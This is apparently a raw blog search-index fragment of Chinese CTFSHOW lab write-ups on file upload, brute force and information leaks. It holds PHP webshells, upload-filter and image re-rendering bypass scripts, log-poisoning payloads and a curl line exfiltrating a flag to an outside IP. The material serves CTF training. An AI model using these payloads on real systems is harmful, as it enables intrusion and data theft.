__name__==\u0026#34;__main__\u0026#34;: 190 main() ","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","summary":"\u003cblockquote\u003e\n\u003cp\u003e以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch4 id=\"web78\"\u003eWeb78\u003c/h4\u003e\n\u003cp\u003ephp伪协议\u003c/p\u003e","title":"CTFSHOW-文件包含-Writeup"},{"content":"web151 前台验证\n将一句话木马改成png，抓包修改后缀即可\npayload:\n1=system(\u0026#39;cat /var/www/html/flag.php\u0026#39;); web152 这道题没有前端检验，但是解法跟web151是一样的\nweb153 一开始尝试了大小写绕过\n上传后发现服务器不解析\n这题可以利用.user.ini来进行文件上传\n[文件上传]浅析.user.ini的利用-CSDN博客\n首先我们在文件中写入\n这句话相当于php中的文件包含\n写入后将文件改为png上传，抓包将文件名改为.user.ini\n接着将一句话木马改为1.png上传\n接着访问 /upload/index.php\npayload:\n1=system(\u0026#39;tac ../f*\u0026#39;); 注意这个方法的前提是文件上传的目录中有能够执行的php的文件（如index.php）\nweb154 这题跟上题差不多，只是过滤了php\n将一句话木马改成短标签的形式就可以了（我一直用的短标签所以没什么影响）\nweb155 解法同web154一样\nweb156 这题有新的waf,可以测出来waf掉了[]\n那既然这样我们直接读flag就是了\n\u0026lt;?=system(\u0026#39;cat ../f*\u0026#39;);?\u0026gt; 或者也可以用{}代替[\u0026rsquo;']\n\u0026lt;?=@eval($_GET{1});?\u0026gt; web157 这道题[]和;都被waf了\npayload:\n\u0026lt;?=system(\u0026#34;tac ../f*\u0026#34;)?\u0026gt; 不写;就行了\nweb158 这题和上题的解法一样\nweb159 这题waf掉了()\n没有()怎么进行rce呢？我们可以想到``进行命令执行的技巧\npayload:\n\u0026lt;?=`tac ../f*`?\u0026gt; web160 一开始发现.user.ini穿不上，后面测到原来是空格被waf了，.user.ini里也不能有空格\n相比上一题这题将空格和``反引号和log过滤掉了\n这题我们可以考虑使用日志注入的方法\n尝试一下包含日志 nginx的log在/var/log/nginx/access.log\npayload:\n\u0026lt;?=include\u0026#34;/var/l\u0026#34;.\u0026#34;og/nginx/access.l\u0026#34;.\u0026#34;og\u0026#34;?\u0026gt; 看到有user-agent说明这条路行得通\n直接读flag\nweb161 这一题在上一题的基础上增加了文件头的检验\n我们可以通过在上传文件的时候加上图片的文件头GIF89a进行绕过\n其余和web160无异，利用文件包含进行日志注入即可\nweb162 fuzz一下可以发现这题把.也ban掉了\n所以我们在上传的.user.ini时我们可以去掉文件后缀\nGIF89a\rauto_prepend_file=1 接下来考虑怎么构造读flag\n可以通过取反绕过.的过滤，进行文件包含\n\u0026lt;?=$a=\u0026#34;Ñ\u0026#34;?\u0026gt; \u0026lt;?=$b=~$a?\u0026gt;\r\u0026lt;?=$l=\u0026#34;l\u0026#34;?\u0026gt;\r\u0026lt;?=$o=\u0026#34;o\u0026#34;?\u0026gt;\r\u0026lt;?=$g=\u0026#34;g\u0026#34;?\u0026gt;\r\u0026lt;?=include\u0026#34;/var/$l$o$g/nginx/access$b$l$o$g\u0026#34;?\u0026gt; 文件 1 中的内容 下面的Ñ 为 . 取反后的字符 十六进制为 D1，利用的时候，在brup 中更改hex里的值。\n日志注入即可\nweb163 这题和上题的条件差不多，但是存在竞争条件，上传图片的话会被删掉\n这题我们尝试使用远程文件包含\n我们把payload写在服务器上，然后起一个http服务\n记住，文件包含时要把ip转换成长整型（.被waf了）\nGIF89a\rauto_prepend_file=http://长整型ip:7777/s 传.user.ini\n接着搓一个发包脚本\n1import requests 2 3while True: 4 burp0_url = \u0026#34;http://3de6e682-59e3-489c-8e72-2b74e3db5058.challenge.ctf.show/\u0026#34; 5 burp1_url = \u0026#34;http://3de6e682-59e3-489c-8e72-2b74e3db5058.challenge.ctf.show/upload/\u0026#34; 6 burp0_headers = {\u0026#34;Sec-Ch-Ua-Platform\u0026#34;: \u0026#34;\\\u0026#34;Windows\\\u0026#34;\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Sec-Ch-Ua\u0026#34;: \u0026#34;\\\u0026#34;Not?A_Brand\\\u0026#34;;v=\\\u0026#34;99\\\u0026#34;, \\\u0026#34;Chromium\\\u0026#34;;v=\\\u0026#34;130\\\u0026#34;\u0026#34;, \u0026#34;Sec-Ch-Ua-Mobile\u0026#34;: \u0026#34;?0\u0026#34;, \u0026#34;X-Requested-With\u0026#34;: \u0026#34;XMLHttpRequest\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;application/json, text/javascript, */*; q=0.01\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;multipart/form-data; boundary=----WebKitFormBoundaryBcDoqZWhQP52WEA6\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;https://938b9a73-97ad-4b15-81d8-0101678e16f8.challenge.ctf.show\u0026#34;, \u0026#34;Sec-Fetch-Site\u0026#34;: \u0026#34;same-origin\u0026#34;, \u0026#34;Sec-Fetch-Mode\u0026#34;: \u0026#34;cors\u0026#34;, \u0026#34;Sec-Fetch-Dest\u0026#34;: \u0026#34;empty\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;https://938b9a73-97ad-4b15-81d8-0101678e16f8.challenge.ctf.show/\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Priority\u0026#34;: \u0026#34;u=1, i\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 7 burp0_data = \u0026#34;------WebKitFormBoundaryBcDoqZWhQP52WEA6\\r\\nContent-Disposition: form-data; name=\\\u0026#34;file\\\u0026#34;; filename=\\\u0026#34;.user.ini\\\u0026#34;\\r\\nContent-Type: image/png\\r\\n\\r\\nGIF89a\\r\\nauto_prepend_file=http://长整型ip:7777/shell\\r\\n------WebKitFormBoundaryBcDoqZWhQP52WEA6--\\r\\n\u0026#34; 8 log = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 9 log1 = requests.get(burp1_url) 10 print(log.status_code) 11 print(\u0026#39;\\n\u0026#39;) 12 print(log1.text) 13 if \u0026#34;ctfshow\u0026#34; in log1.text: 14 print(\u0026#39;getflag\u0026#39;) 15 break web164 这题随便传个图片试试发现多了个查看图片\nhttps://775e9cd3-3a73-47a1-b31d-7b4450ec5573.challenge.ctf.show/download.php?image=94f7678cc4cda39c02c7890bc8fe6941.png 从url我们可以看出这题存在图片包含\n我们可以利用这个文件包含去执行我们的图片马\n大佬的脚本，可以绕过二次渲染\n1\u0026lt;?php 2$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 3 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 4 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 5 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 6 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 7 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 8 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 9 0x66, 0x44, 0x50, 0x33); 10 11 12 13$img = imagecreatetruecolor(32, 32); 14 15for ($y = 0; $y \u0026lt; sizeof($p); $y += 3) { 16 $r = $p[$y]; 17 $g = $p[$y+1]; 18 $b = $p[$y+2]; 19 $color = imagecolorallocate($img, $r, $g, $b); 20 imagesetpixel($img, round($y / 3), 0, $color); 21} 22 23imagepng($img,\u0026#39;./1.png\u0026#39;); 24?\u0026gt; 图片马的内容 \u0026lt;?$_GET[0]($_POST[1]);?\u0026gt; 没有回显\n外带读flag\nPOST 1=cat f* | curl -X POST -d @- http://106.55.168.231:7777/\rGET 0=system web165 这题考察的也是图片马，但是是用jpg的图片马绕过二次渲染\n大佬的脚本\n1\u0026lt;?php 2 /* 3 4 The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). 5 It is necessary that the size and quality of the initial image are the same as those of the processed image. 6 7 1) Upload an arbitrary image via secured files upload script 8 2) Save the processed image and launch: 9 jpg_payload.php \u0026lt;jpg_name.jpg\u0026gt; 10 11 In case of successful injection you will get a specially crafted image, which should be uploaded again. 12 13 Since the most straightforward injection method is used, the following problems can occur: 14 1) After the second processing the injected data may become partially corrupted. 15 2) The jpg_payload.php script outputs \u0026#34;Something\u0026#39;s wrong\u0026#34;. 16 If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. 17 18 Sergey Bobrov @Black2Fan. 19 20 See also: 21 https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ 22 23 */ 24\t25 $miniPayload = \u0026#34;\u0026lt;?=eval(\\$_POST[7]);?\u0026gt;\u0026#34;; //注意$转义 26 27 28 if(!extension_loaded(\u0026#39;gd\u0026#39;) || !function_exists(\u0026#39;imagecreatefromjpeg\u0026#39;)) { 29 die(\u0026#39;php-gd is not installed\u0026#39;); 30 } 31 32 if(!isset($argv[1])) { 33 die(\u0026#39;php jpg_payload.php \u0026lt;jpg_name.jpg\u0026gt;\u0026#39;); 34 } 35 36 set_error_handler(\u0026#34;custom_error_handler\u0026#34;); 37 38 for($pad = 0; $pad \u0026lt; 1024; $pad++) { 39 $nullbytePayloadSize = $pad; 40 $dis = new DataInputStream($argv[1]); 41 $outStream = file_get_contents($argv[1]); 42 $extraBytes = 0; 43 $correctImage = TRUE; 44 45 if($dis-\u0026gt;readShort() != 0xFFD8) { 46 die(\u0026#39;Incorrect SOI marker\u0026#39;); 47 } 48 49 while((!$dis-\u0026gt;eof()) \u0026amp;\u0026amp; ($dis-\u0026gt;readByte() == 0xFF)) { 50 $marker = $dis-\u0026gt;readByte(); 51 $size = $dis-\u0026gt;readShort() - 2; 52 $dis-\u0026gt;skip($size); 53 if($marker === 0xDA) { 54 $startPos = $dis-\u0026gt;seek(); 55 $outStreamTmp = 56 substr($outStream, 0, $startPos) . 57 $miniPayload . 58 str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize) . 59 substr($outStream, $startPos); 60 checkImage(\u0026#39;_\u0026#39;.$argv[1], $outStreamTmp, TRUE); 61 if($extraBytes !== 0) { 62 while((!$dis-\u0026gt;eof())) { 63 if($dis-\u0026gt;readByte() === 0xFF) { 64 if($dis-\u0026gt;readByte !== 0x00) { 65 break; 66 } 67 } 68 } 69 $stopPos = $dis-\u0026gt;seek() - 2; 70 $imageStreamSize = $stopPos - $startPos; 71 $outStream = 72 substr($outStream, 0, $startPos) . 73 $miniPayload . 74 substr( 75 str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize). 76 substr($outStream, $startPos, $imageStreamSize), 77 0, 78 $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 79 substr($outStream, $stopPos); 80 } elseif($correctImage) { 81 $outStream = $outStreamTmp; 82 } else { 83 break; 84 } 85 if(checkImage(\u0026#39;payload_\u0026#39;.$argv[1], $outStream)) { 86 die(\u0026#39;Success!\u0026#39;); 87 } else { 88 break; 89 } 90 } 91 } 92 } 93 unlink(\u0026#39;payload_\u0026#39;.$argv[1]); 94 die(\u0026#39;Something\\\u0026#39;s wrong\u0026#39;); 95 96 function checkImage($filename, $data, $unlink = FALSE) { 97 global $correctImage; 98 file_put_contents($filename, $data); 99 $correctImage = TRUE; 100 imagecreatefromjpeg($filename); 101 if($unlink) 102 unlink($filename); 103 return $correctImage; 104 } 105 106 function custom_error_handler($errno, $errstr, $errfile, $errline) { 107 global $extraBytes, $correctImage; 108 $correctImage = FALSE; 109 if(preg_match(\u0026#39;/(\\d+) extraneous bytes before marker/\u0026#39;, $errstr, $m)) { 110 if(isset($m[1])) { 111 $extraBytes = (int)$m[1]; 112 } 113 } 114 } 115 116 class DataInputStream { 117 private $binData; 118 private $order; 119 private $size; 120 121 public function __construct($filename, $order = false, $fromString = false) { 122 $this-\u0026gt;binData = \u0026#39;\u0026#39;; 123 $this-\u0026gt;order = $order; 124 if(!$fromString) { 125 if(!file_exists($filename) || !is_file($filename)) 126 die(\u0026#39;File not exists [\u0026#39;.$filename.\u0026#39;]\u0026#39;); 127 $this-\u0026gt;binData = file_get_contents($filename); 128 } else { 129 $this-\u0026gt;binData = $filename; 130 } 131 $this-\u0026gt;size = strlen($this-\u0026gt;binData); 132 } 133 134 public function seek() { 135 return ($this-\u0026gt;size - strlen($this-\u0026gt;binData)); 136 } 137 138 public function skip($skip) { 139 $this-\u0026gt;binData = substr($this-\u0026gt;binData, $skip); 140 } 141 142 public function readByte() { 143 if($this-\u0026gt;eof()) { 144 die(\u0026#39;End Of File\u0026#39;); 145 } 146 $byte = substr($this-\u0026gt;binData, 0, 1); 147 $this-\u0026gt;binData = substr($this-\u0026gt;binData, 1); 148 return ord($byte); 149 } 150 151 public function readShort() { 152 if(strlen($this-\u0026gt;binData) \u0026lt; 2) { 153 die(\u0026#39;End Of File\u0026#39;); 154 } 155 $short = substr($this-\u0026gt;binData, 0, 2); 156 $this-\u0026gt;binData = substr($this-\u0026gt;binData, 2); 157 if($this-\u0026gt;order) { 158 $short = (ord($short[1]) \u0026lt;\u0026lt; 8) + ord($short[0]); 159 } else { 160 $short = (ord($short[0]) \u0026lt;\u0026lt; 8) + ord($short[1]); 161 } 162 return $short; 163 } 164 165 public function eof() { 166 return !$this-\u0026gt;binData||(strlen($this-\u0026gt;binData) === 0); 167 } 168 } 169?\u0026gt; jpg图片比较脆弱，成功率很低，我试了十多张图片都没成功\nweb166 zip注入\n这题只能上传zip，上传后会出现查看文件，存在文件包含\n本质上就是利用文件包含执行我们的恶意代码\nweb167 .htaccess文件利用\n什么是.htaccess？\nhtaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n如果服务器开启了.htaccess，那我们就可以利用.htaccess将jpg或者png等后缀的文件，作为php文件解析\nAddType/AddHandler application/x-httpd-php \u0026#34;.jpg\u0026#34; 由于有前端验证，我们要先把编写好的.htaccess文件改为.jpg后缀\n再通过抓包将文件名修改为.htaccess\n接着上传我们写好的一句话木马(后缀为.jpg)\n可以看到我们的一句话木马已经被成功执行了\nweb168 基础免杀\n这题没有限制文件类型，可以上传php\n应该是对关键词有过滤\n简单拼接一下试试，没想到直接成功了\npayload\n\u0026lt;?php $a=\u0026#34;sys\u0026#34;.\u0026#34;tem\u0026#34;; $a($_REQUEST[1]);? GET 1=tac%20../flagaa.php web169 .user.ini文件包含\n前端做了校验只能传zip文件,后端又做了图片文件检查(需要改成image/png).过滤了\u0026lt;\u0026gt;和php\n先上传一个index.php，然后利用日志包含，上传.user.ini 写入以下内容进行包含然后UA里面写木马\nauto_append_file=\u0026#34;/var/log/nginx/access.log\u0026#34;\r\u0026lt;?=system(\u0026#39;cat ../flagaa.php\u0026#39;)?\u0026gt; web170 这题和web169解法一样，也是可以进行日志包含\n","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","summary":"\u003ch4 id=\"web151\"\u003eweb151\u003c/h4\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250126161249975\" loading=\"lazy\" src=\"../assets/image-20250126161249975.png\"\u003e\u003c/p\u003e\n\u003cp\u003e前台验证\u003c/p\u003e\n\u003cp\u003e将一句话木马改成png，抓包修改后缀即可\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250126162045356\" loading=\"lazy\" src=\"../assets/image-20250126162045356.png\"\u003e\u003c/p\u003e\n\u003cp\u003epayload:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e1=system(\u0026#39;cat /var/www/html/flag.php\u0026#39;);\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 id=\"web152\"\u003eweb152\u003c/h4\u003e\n\u003cp\u003e这道题没有前端检验，但是解法跟web151是一样的\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250126162605410\" loading=\"lazy\" src=\"../assets/image-20250126162605410.png\"\u003e\u003c/p\u003e\n\u003ch4 id=\"web153\"\u003eweb153\u003c/h4\u003e\n\u003cp\u003e一开始尝试了大小写绕过\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250126162904156\" loading=\"lazy\" src=\"../assets/image-20250126162904156.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上传后发现服务器不解析\u003c/p\u003e","title":"CTFSHOW-文件上传-Writeup"},{"content":"web21 抓个包\n我们可以看到他的账号密码是通过base64编码加密后再发送的，问题不大\npayload设置如下\n我们还要设置一下payload处理\n开始爆破，根据长度或者状态码判断即可\nweb22 域名爆破\n通过爆破ctf.show的子域名可以爆破到flag.ctf.show\n访问即可得到flag(虽然已经挂了)\nweb23 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 11:43:51 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 11:56:11 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13error_reporting(0); 14 15include(\u0026#39;flag.php\u0026#39;); 16if(isset($_GET[\u0026#39;token\u0026#39;])){ 17 $token = md5($_GET[\u0026#39;token\u0026#39;]); 18 if(substr($token, 1,1)===substr($token, 14,1) \u0026amp;\u0026amp; substr($token, 14,1) ===substr($token, 17,1)){ 19 if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){ 20 echo $flag; 21 } 22 } 23}else{ 24 highlight_file(__FILE__); 25 26} 27?\u0026gt; 分析代码可知： 需要找到一个合适的 token 值，使得以下条件成立：\n1、md5(token) 的第 1 位（从 0 开始算）等于第 14 位\n2、md5(token) 的第 14 位等于第 17 位。\n3、md5(token) 的第 1 位的整数值、14 位的整数值、和 17 位的整数值的和除以第 1 位的整数值等于第 31 位的整数值。\n既然不知道怎么凑那我们可以尝试爆破\n通过bp爆破一下1-1000中是否有符合上述条件的字符串\n哎我草，怎么就爆破出来了，虽然不知道为什么纯数字还能爆出来\n其他解法，可以用大佬的脚本\n1# coding: utf-8 2# alberthao 3import hashlib 4 5dic = \u0026#39;0123456789qazwsxedcrfvtgbyhnujmikolp\u0026#39; 6for a in dic: 7 for b in dic: 8 t = str(a) + str(b) 9 md5 = hashlib.md5(t.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() 10 # print md5 11 # print md5[1:2] 12 # print md5[14:15] 13 # print md5[17:18] 14 if md5[1:2] == md5[14:15] and md5[14:15] == md5[17:18]: 15 if (ord(md5[1:2])) \u0026gt;= 48 and ord(md5[1:2]) \u0026lt;= 57 and (ord(md5[14:15])) \u0026gt;= 48 and ord(md5[14:15]) \u0026lt;= 57: 16 if (ord(md5[17:18])) \u0026gt;= 48 and ord(md5[17:18]) \u0026lt;= 57 and (ord(md5[31:32])) \u0026gt;= 48 and ord( 17 md5[31:32]) \u0026lt;= 57: 18 if (int(md5[1:2]) + int(md5[14:15]) + int(md5[17:18])) / int(md5[1:2]) == int(md5[31:32]): 19 print(t) or\n1import hashlib 2for i in range(1,10000): 3 4md5 = hashlib.md5(str(i).encode(\u0026#39;utf-8\u0026#39;)).hexdigest() 5 6if md5[1] != md5[14] or md5[14]!= md5[17]: 7\tcontinue 8 9if(ord(md5[1]))\u0026gt;=48 and ord(md5[1])\u0026lt;=57 and (ord(md5[31]))\u0026gt;=48 and ord(md5[31])\u0026lt;=57: 10 11\tif((int(md5[1])+int(md5[14])+int(md5[17]))/int(md5[1])==int(md5[31])): 12 13\tprint(i) web24 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 13:26:39 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 13:53:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15include(\u0026#34;flag.php\u0026#34;); 16if(isset($_GET[\u0026#39;r\u0026#39;])){ 17 $r = $_GET[\u0026#39;r\u0026#39;]; 18 mt_srand(372619038); 19 if(intval($r)===intval(mt_rand())){ 20 echo $flag; 21 } 22}else{ 23 highlight_file(__FILE__); 24 echo system(\u0026#39;cat /proc/version\u0026#39;); 25} 26 27?\u0026gt; 这道题考察的是一个php伪随机数的题目\nmt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的\n虽然说是随机数，但是同一个种子会生成同一串数字\npoc\n1\u0026lt;?php 2mt_srand(372619038); 3echo intval(mt_rand()); 4?\u0026gt; 不知道跟版本有没有关系，我随便找的php在线运行，成功得到flag\nweb25 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 13:56:57 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 15:47:33 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15error_reporting(0); 16include(\u0026#34;flag.php\u0026#34;); 17if(isset($_GET[\u0026#39;r\u0026#39;])){ 18 $r = $_GET[\u0026#39;r\u0026#39;]; 19 mt_srand(hexdec(substr(md5($flag), 0,8))); 20 $rand = intval($r)-intval(mt_rand()); 21 if((!$rand)){ 22 if($_COOKIE[\u0026#39;token\u0026#39;]==(mt_rand()+mt_rand())){ 23 echo $flag; 24 } 25 }else{ 26 echo $rand; 27 } 28}else{ 29 highlight_file(__FILE__); 30 echo system(\u0026#39;cat /proc/version\u0026#39;); 31} 继续php伪随机数\n我们需要知道一个性质\n当mt_srand()中的种子是固定的，那么我们生成的随机数的序列就是相同的，如下\n1\u0026lt;?php 2 3mt_srand(1852100618); 4 5echo mt_rand(); 6echo mt_rand(); 7echo mt_rand(); 8echo mt_rand(); 9 10\u0026#39;\u0026#39;\u0026#39; 111640856123 121390302953 13893879251 14859994814 在这道题里面我们需要得到前三个随机数\n第一个随机数我们可以使r=0得到，第一个随机数为1640856123\n得到第一个随机数之后我们可以通过爆破的方式得到种子，从而得到第二，第三个随机数\nphp脚本(极其慢)\n1\u0026lt;?php 2$a= 390148868;//第一个随机数 3$b= 0 ; 4while (true){ 5 mt_srand($b); 6 if(mt_rand()==$a){ 7 echo \u0026#34;success:\u0026#34;+$b; 8 break; 9 } 10 echo $b; 11 echo \u0026#34;\\n\u0026#34;; 12 $b+=1; 13 14} 或者使用php_mt_seed-4.0工具\n我们可以看到不同版本的seed是不同的，我们一个个试试就行了\n1mt_srand(1852100618); 2echo mt_rand();// 第一次随机数（不能少） 3echo \u0026#34;\\ntoken：\u0026#34;; 4echo (mt_rand()+mt_rand()); //第二和第三次随机数相加，也就是我们要对token 得到token的值，我们只需要使rand为零即可得到flag\n也就是说我们只需要使r等于第一次随机数即可\n传参，得到flag\nweb26 这么多我咋爆，赌一把只爆密码\nweb27 这题是一个教务系统，需要通过账号密码登录\n先信息收集一下\n我们可以看到在账号密码下面有一个录取名单和学生学籍信息查询系统\n分别如上，那我们是否可以通过爆破学生的身份证信息从而通过录取查询查到学生的信息呢？\nbp抓个包\n哎我草，我数据呢\nforward一下（是因为数据实际上在checkdb.php才提交吗？不是很懂）\n我们可以发现其实身份证缺失的部分刚好是出生日期\n那我们可以用bp中的日期爆破功能\n爆出来的msg用unicode解码一下就能得到账号密码了\n贴个大佬的脚本\n1url=\u0026#39;https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php\u0026#39; NUM=32 2 3def run_tasks(L): U=[] for i in L: U.append(asyncio.ensure_future(i)) loop = asyncio.get_event_loop() loop.run_until_complete(asyncio.wait(U)) 4 5class TaskRuner: def init(self,n) -\u0026gt; None: self.L=[] for i in range(n): self.L.append(self.task_function(i)) self.task_num=n async def task_function(self,n): pass def run(self): run_tasks(self.L) self.on_over() def on_over(self): pass 6 7import aiohttp from urllib.parse import quote from datetime import date, timedelta 8 9class NYR: def init(self,start_date,end_date) -\u0026gt; None: self.start_date=start_date self.end_date=end_date self.delta = timedelta(days=1) self.current_date = start_date def next(self): t=self.current_date if t\u0026gt;self.end_date: return None self.current_date+=self.delta return t 10 11class Scanner(TaskRuner): def init(self,d1,d2,n) -\u0026gt; None: super().init(n) self.nyr=NYR(d1,d2) self.alive=True 12 13async def task_function(self, n): 14 while self.alive: 15 u=self.nyr.next() 16 if not u: 17 break 18 r=await self.login(u) 19 if r: 20 self.alive=False 21async def login(self,t:date): 22 url=\u0026#39;https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php\u0026#39; 23 n=t.year 24 y=t.month 25 r=t.day 26 n=str(n) 27 y=str(y) 28 r=str(r) 29 if len(y)==1: 30 y=\u0026#39;0\u0026#39;+y 31 if len(r)==1: 32 r=\u0026#39;0\u0026#39;+r 33 sfz=\u0026#39;621022\u0026#39;+n+y+r+\u0026#39;5237\u0026#39; 34 data={ 35 \u0026#39;a\u0026#39;:\u0026#39;高先伊\u0026#39;, 36 \u0026#39;p\u0026#39;:sfz, 37 } 38 sess=aiohttp.ClientSession() 39 try: 40 r=await sess.post(url=url,data=data,ssl=False) 41 text=await r.text() 42 js=loads(text) 43 msg=js[\u0026#39;msg\u0026#39;] 44 print(sfz,msg) 45 await sess.close() 46 return msg!=\u0026#39;提交信息有误\u0026#39; 47 except Exception as e: 48 print(e) 49 pass 50 try: 51 await sess.close() 52 except: 53 pass 54 return False 55 56async def handle_up(self,u,p): 57 pass 58a=Scanner(date(1990,1,1),date(2010,12,12),NUM) 59 60a.run() web28 这题本来不知道要干嘛\ndirsearch扫一下,感觉应该是目录爆破\n先爆破一下0-100\n","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E7%88%86%E7%A0%B4/","summary":"\u003ch4 id=\"web21\"\u003eweb21\u003c/h4\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241123165104490\" loading=\"lazy\" src=\"../assets/image-20241123165104490.png\"\u003e\u003c/p\u003e\n\u003cp\u003e抓个包\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241123165621808\" loading=\"lazy\" src=\"../assets/image-20241123165621808.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们可以看到他的账号密码是通过base64编码加密后再发送的，问题不大\u003c/p\u003e\n\u003cp\u003epayload设置如下\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241123165947562\" loading=\"lazy\" src=\"../assets/image-20241123165947562.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241123170139759\" loading=\"lazy\" src=\"../assets/image-20241123170139759.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们还要设置一下payload处理\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241123170509504\" loading=\"lazy\" src=\"../assets/image-20241123170509504.png\"\u003e\u003c/p\u003e\n\u003cp\u003e开始爆破，根据长度或者状态码判断即可\u003c/p\u003e","title":"CTFSHOW-爆破-Writeup"},{"content":"Web 1-5 查看网页源代码 抓个包看有没有藏东西 查看robots.txt phps源码泄露，访问index.phps，通过其源码泄露，在其中找到flag Web6 网页提示下载源码查看，访问url/www.zip得到源码文件\n解压文件我们得到\n打开fl00g.txt，没有我们想要的flag\n打开index.php\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-01 14:37:13 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-01 14:42:44 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13//flag in fl000g.txt 14echo \u0026#34;web6:where is flag?\u0026#34; 15?\u0026gt; 显示flag in fl00g.txt\n直接访问url/fl00g.txt得到flag\nweb7 git泄露，访问url/.git即可得到flag\nweb8 svn泄露，访问url/.git即可得到flag\nweb9 vim缓存信息泄露，访问url/index.php.swp，打开下载的index.php.swp即可得到flag\nweb10 根据hint查看cookie可以看到\ncookie:flag=ctfshow%7B3ac14c03-64d1-41aa-9328-c97bcceeb840%7D\n进行url解码即可得到flag\nweb11 域名解析\n我们可以通过nslookup来进行域名解析查询\nnslookup -qt=格式 URL nslookup -qt=any URL //遍历所有格式 nslookup -qt=TXT URL\r//查询txt格式 web12 hint：有时候网站上的公开信息，就是管理员常用密码\n先用dirsearch扫一下\n访问admin，要求我们输入管理员账号密码，根据后台路径我们可以猜测账号为admin\n回到主页，在网页的底部我们可以看到一个电话Help Line Number : 372619038\n猜测电话为管理员密码，输入后成功得到flag\nweb13 在页面底部可以看到一个document\n点击发现下载了一个document.pdf文件，文件里有后台的地址和账号密码\nd\n登录后台即可得到flag\nweb14 